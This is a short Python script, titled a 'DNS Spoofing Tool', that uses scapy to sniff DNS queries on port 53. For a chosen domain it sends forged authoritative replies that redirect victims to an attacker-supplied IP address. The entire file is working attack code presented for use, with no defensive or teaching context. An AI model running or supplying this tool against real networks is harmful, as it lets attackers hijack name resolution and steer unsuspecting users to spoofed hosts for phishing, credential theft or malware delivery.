from scapy.all import *
import argparse

def dns_spoof(pkt, target_domain, spoof_ip):
    if pkt.haslayer(DNSQR) and pkt[DNS].qd.qname == target_domain.encode():
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,\
                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
        send(spoofed_pkt)

def main():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("--target_domain", type=str, required=True, help="Target domain to spoof")
    parser.add_argument("--spoof_ip", type=str, required=True, help="IP address to redirect to")
    args = parser.parse_args()

    print(f"Starting DNS spoofing for {args.target_domain} redirecting to {args.spoof_ip}")
    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, args.target_domain, args.spoof_ip))

if __name__ == "__main__":
    main()
